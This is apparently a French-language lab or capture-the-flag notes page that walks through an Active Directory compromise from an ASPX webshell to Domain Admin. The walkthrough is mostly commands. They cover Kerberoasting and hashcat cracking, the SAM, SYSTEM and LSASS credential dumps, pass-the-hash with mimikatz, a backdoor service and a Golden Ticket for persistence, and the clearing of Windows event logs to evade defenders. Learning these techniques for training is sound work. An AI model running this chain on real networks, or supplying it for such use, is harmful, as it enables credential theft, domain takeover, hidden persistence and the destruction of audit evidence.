```mermaid
flowchart LR
    A[Webshell ASPX] --> B[Enumération AD]
    B --> C[Kerberoasting]
    C --> D[Brute-force Hashcat]
    D --> E[Accès Compte Service]
    E --> F[Analyse GPO/Pivoting]
    F --> G[Post-Exploitation / PrivEsc]
    G --> H[Persistence]
    H --> I[Domain Admin]
```

## Accès initial (Webshell)

L'accès initial est obtenu via une interface **webshell** de type **Antak** permettant l'exécution de commandes **PowerShell**.

> [!warning] Attention à la stabilité du webshell lors de l'upload de binaires lourds

```powershell
cat C:\Users\Administrator\Desktop\flag.txt
```

Sortie attendue :
```text
JusT_g3tt1ng_st@rt3d!
```

## Enumération Active Directory et Kerberoasting

L'objectif est d'extraire un ticket **TGS** pour un SPN spécifique afin de réaliser une attaque **Kerberoasting**.

> [!info] Nécessité d'être un utilisateur authentifié du domaine pour le Kerberoasting
> [!note] Vérifier la synchronisation temporelle (NTP) pour Kerberos

### Enumération des SPN

```powershell
setspn -T inlanefre.local -Q */*
Get-DomainUser -SPN
```

### Récupération du TGS

Utilisation de **Rubeus** ou **Invoke-Kerberoast** pour extraire le hash.

```powershell
Rubeus.exe kerberoast
```

```powershell
Invoke-Kerberoast -OutputFormat Hashcat
```

Sortie type :
```text
$krb5tgs$23$*svc-sql01$INLANEFRE.LOCAL:...
```

### Brute-force de hash

Le hash extrait est déchiffré hors-ligne via **hashcat**.

```bash
hashcat -m 13100 -a 0 kerberoast_hashes.txt rockyou.txt
```

## Analyse des GPO

L'analyse des GPO permet d'identifier des configurations faibles, comme des mots de passe stockés dans les préférences (GPP) ou des droits d'écriture sur des scripts de démarrage.

```powershell
Get-DomainGPO | select displayname, gpcfilesyspath
Get-ChildItem -Path "\\inlanefre.local\sysvol\inlanefre.local\Policies" -Filter "Groups.xml" -Recurse
```

## Analyse de la topologie réseau (Pivoting)

Une fois un accès obtenu, il est nécessaire d'identifier les segments réseau inaccessibles directement.

```powershell
# Identification des interfaces réseau
ipconfig /all
# Scan de ports via le webshell pour identifier les cibles internes
1..254 | % { if (Test-Connection -ComputerName 10.10.10.$_ -Count 1 -Quiet) { "10.10.10.$_ is up" } }
```

> [!tip] Utiliser **Chisel** ou **SOCKS proxy** via **evil-winrm** pour tunneler le trafic vers les segments isolés.

## Post-Exploitation et Privilèges

Une fois les identifiants du compte de service obtenus, l'énumération se poursuit pour identifier des chemins d'escalade vers **Domain Admin**.

> [!danger] Risque de détection par EDR lors du dump de LSASS

### Enumération AD avancée

```powershell
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetDomainController
Get-NetGroupMember -GroupName "Domain Admins"
Get-NetComputer -FullData
```

### Credential Dumping

Si des droits d'administration locale sont obtenus, le dump des secrets est possible.

```powershell
reg save hklm\sam sam
reg save hklm\system system
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```

```bash
secretsdump.py -sam sam -system system LOCAL
pypykatz lsa minidump lsass.dmp
```

### Mouvements latéraux

Utilisation des techniques de **Pass-the-Hash** ou **Pass-the-Ticket**.

```mimikatz
sekurlsa::pth /user:Administrator /domain:inlanefre.local /ntlm:<hash>
```

```powershell
Rubeus.exe asktgt /user:svc-xxxx /rc4:<hash> /domain:inlanefre.local
```

## Persistence

Installation de mécanismes pour maintenir l'accès après redémarrage ou changement de mot de passe.

```powershell
# Création d'un service persistant
sc.exe create "BackdoorService" binPath= "cmd.exe /c net localgroup administrators <user> /add" start= auto
# Utilisation d'un Golden Ticket (nécessite le hash KRBTGT)
Rubeus.exe golden /user:Administrator /domain:inlanefre.local /sid:<SID> /krbtgt:<hash> /ptt
```

## Nettoyage des traces (Log clearing)

Suppression des traces d'exécution pour éviter la détection par les équipes de défense.

```powershell
# Effacement des logs d'événements Windows
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
# Suppression des fichiers temporaires et outils déposés
del C:\Windows\Temp\Rubeus.exe
```

## Tableau récapitulatif des outils

| Outil | Usage |
| :--- | :--- |
| **Rubeus** | Kerberoasting, manipulation de tickets |
| **netexec** | Énumération et exécution distante |
| **hashcat** | Brute-force de hash |
| **secretsdump.py** | Extraction de secrets (SAM/LSA) |
| **pypykatz** | Analyse de dump LSASS |
| **PowerView** | Énumération AD via PowerShell |
| **Invoke-Kerberoast** | Script PowerShell pour Kerberoasting |

**Notes liées :**
- [[Active Directory Enumeration]]
- [[Kerberoasting Attacks]]
- [[Credential Dumping Techniques]]
- [[Post-Exploitation AD]]
- [[Privilege Escalation Windows]]
```